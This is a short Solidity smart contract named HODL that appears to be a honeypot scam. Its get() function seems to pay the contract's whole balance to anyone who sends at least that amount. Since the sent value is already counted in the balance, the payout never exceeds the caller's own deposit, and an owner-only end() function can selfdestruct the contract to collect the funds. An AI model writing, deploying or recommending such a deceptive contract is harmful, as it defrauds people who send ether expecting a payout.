pragma solidity ^0.4.25;

contract HODL
{
    address hodl = msg.sender;
    function() external payable {}
    function end() public {
        if (msg.sender==hodl)
            selfdestruct(msg.sender);
    }
    function get() public payable {
        if (msg.value >= address(this).balance)
            msg.sender.transfer(address(this).balance);
    }
}